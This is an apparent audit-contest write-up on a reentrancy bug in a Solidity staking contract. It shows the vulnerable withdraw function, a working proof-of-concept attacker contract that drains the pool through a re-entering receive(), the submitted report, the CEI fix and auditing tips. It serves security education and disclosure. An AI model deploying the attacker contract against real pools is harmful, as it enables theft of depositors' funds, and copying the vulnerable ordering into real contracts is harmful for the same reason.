---
title: "Reentrancy in a Staking Contract"
slug: "reentrancy-staking"
platform: "sherlock"
vuln_class: "Reentrancy"
difficulty: "hard"
scope_type: "smart_contract"
bounty: 18500
program: "Confidential — Sherlock Audit Contest"
published_at: "2024-05-15"
tags: ["reentrancy", "solidity", "defi", "staking", "web3", "advanced"]
teaser: "The staking contract updated the user's balance after sending ETH — a one-line ordering mistake that let an attacker drain the pool by re-entering the withdraw function before the state was cleared."
---

## The Program

A DeFi protocol running a competitive audit contest on Sherlock. The contest had a $75,000 prize pool distributed across valid findings, a 10-day window, and around 140 competing auditors.

The scope was a staking contract that let users deposit ETH, earn yield, and withdraw their stake plus rewards. The codebase was ~800 lines of Solidity across 3 contracts. The complexity was moderate — no exotic assembly, no proxy patterns — which made it approachable for an intermediate auditor.

**Why this contest?** ETH-native staking contracts that use `transfer()` or `call()` for withdrawals are historically vulnerable to reentrancy. The contest description mentioned "users can withdraw at any time" — that phrase means there's a withdrawal path worth auditing carefully.

---

## The Recon

The audit started with a manual read-through, not a tool scan. The goal in the first pass: understand the data flow for deposits and withdrawals.

```solidity
// Simplified version of the relevant contract
contract StakingPool {
    mapping(address => uint256) public stakedBalance;
    mapping(address => uint256) public rewardDebt;
    uint256 public totalStaked;

    function deposit() external payable {
        stakedBalance[msg.sender] += msg.value;
        totalStaked += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(stakedBalance[msg.sender] >= amount, "Insufficient balance");
        uint256 rewards = _calculateRewards(msg.sender);

        // Send ETH + rewards to user
        (bool success, ) = msg.sender.call{value: amount + rewards}("");
        require(success, "Transfer failed");

        // Update state AFTER sending
        stakedBalance[msg.sender] -= amount;
        rewardDebt[msg.sender] = block.timestamp;
        totalStaked -= amount;
    }
}
```

The pattern is immediately visible if you know what to look for: **state is updated after the external call**. This is the classic CEI (Checks-Effects-Interactions) violation.

---

## The "Wait a Second..." Moment

The `withdraw` function:
1. **Checks**: `require(stakedBalance[msg.sender] >= amount)` ✓
2. **Interactions**: `msg.sender.call{value: ...}("")` ← sends ETH
3. **Effects**: `stakedBalance[msg.sender] -= amount` ← updates balance

The problem: when the contract sends ETH to `msg.sender` via `.call()`, if `msg.sender` is a contract, execution transfers to that contract's `receive()` or `fallback()` function. At that point, `stakedBalance[msg.sender]` has **not yet been decremented** — the balance still shows the full amount.

An attacker's contract can, inside its `receive()`, call `withdraw()` again. The `require` check passes again (balance still shows original amount), more ETH is sent, and the cycle repeats until the pool is drained.

---

## The Exploit

Proof-of-concept attacker contract:

```solidity
contract Attacker {
    StakingPool public pool;
    uint256 public attackAmount;

    constructor(address _pool) {
        pool = StakingPool(_pool);
    }

    function attack() external payable {
        attackAmount = msg.value;
        pool.deposit{value: msg.value}();
        pool.withdraw(msg.value);
    }

    receive() external payable {
        // Re-enter if pool still has funds
        if (address(pool).balance >= attackAmount) {
            pool.withdraw(attackAmount);
        }
    }
}
```

**Attack flow:**
1. Attacker deposits 1 ETH into the pool
2. Attacker calls `withdraw(1 ETH)`
3. Pool sends 1 ETH → triggers `receive()` in attacker contract
4. Attacker's `receive()` calls `withdraw(1 ETH)` again
5. Balance check passes (not yet decremented) → pool sends another 1 ETH
6. Repeat until pool is empty
7. Finally, state updates — but balance is already gone

In a test environment with a pool containing 50 ETH, the attacker drained it entirely with a 1 ETH deposit — 50x the investment.

**Severity**: Critical. Any user funds in the pool were at total risk of theft by any depositor.

---

## The Report

Sherlock contest reports follow a specific format with severity justification required:

```
Title: Reentrancy in StakingPool.withdraw() allows complete pool drainage

Severity: Critical

Summary:
StakingPool.withdraw() violates the Checks-Effects-Interactions pattern by
performing an external ETH transfer before updating the user's staked balance.
An attacker can deploy a contract that re-enters withdraw() during the ETH
transfer callback, draining the entire pool.

Vulnerability Details:
In StakingPool.sol line 47, the external call `msg.sender.call{value: ...}("")`
executes before `stakedBalance[msg.sender] -= amount` on line 51.
During the call, the attacker's receive() can call withdraw() again.
The require() check on line 44 passes because stakedBalance has not been
decremented yet.

Impact:
Complete loss of all ETH in the staking pool. Any depositor can exploit this
to steal funds from all other users.

Proof of Concept:
[Attacker contract code as shown above]

Recommended Fix:
Apply the CEI pattern — update all state before making external calls:

    stakedBalance[msg.sender] -= amount;  // Effect first
    rewardDebt[msg.sender] = block.timestamp;
    totalStaked -= amount;
    (bool success, ) = msg.sender.call{value: amount + rewards}("");  // Interaction last
    require(success, "Transfer failed");

Alternatively, use OpenZeppelin's ReentrancyGuard modifier.
```

The finding was validated as Critical, earning $18,500 from the contest pool.

---

## The Takeaway

**The one-sentence insight**: in Solidity, any external call (`.call()`, `.transfer()`, token transfers) is a potential reentrancy point — always update state before making them.

**How to find similar bugs:**
- Search the codebase for `.call{value:`, `.transfer(`, `.send(`, and ERC20 `transfer`/`transferFrom` calls
- For each one: read the lines **before** the call — is any state variable decremented or updated after the external call?
- The pattern to memorize: **Checks → Effects → Interactions** in that order
- Tools: Slither's `reentrancy-eth` detector catches basic cases; manual review catches complex cross-function variants

**Common mistakes:**
- Assuming `.transfer()` is safe (it limits gas to 2300, but this protection was weakened by EIP-1884)
- Only checking single-function reentrancy — cross-function variants (withdraw → deposit loop) are harder to spot
- Thinking `nonReentrant` is always present — not all contracts use it
- Missing read-only reentrancy: even view functions called during an attack can return stale state
